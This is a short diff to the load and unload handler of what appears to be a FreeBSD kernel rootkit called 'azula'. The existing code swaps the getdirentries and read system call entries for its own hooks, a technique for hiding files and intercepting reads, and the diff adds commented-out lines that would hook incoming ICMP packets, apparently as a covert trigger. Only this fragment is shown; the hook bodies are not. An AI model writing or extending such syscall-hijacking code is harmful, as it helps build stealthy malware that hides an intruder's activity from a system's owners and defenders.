@@ -180,6 +180,7 @@ static int load(struct module *module, int cmd, void *args){
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)azula_getdirentries;
             sysent[SYS_read].sy_call = (sy_call_t *)azula_read;
+            // inetsw[ip_protox[IPPROTO_ICMP]].pr_input = azula_icmp_hook;
             // sysent[SYS_open].sy_call = (sy_call_t *)azula_open;
             break;
         case MOD_UNLOAD:
@@ -188,6 +189,7 @@ static int load(struct module *module, int cmd, void *args){
         #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
             sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
+            // inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;          
             // sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
             break;
         default:
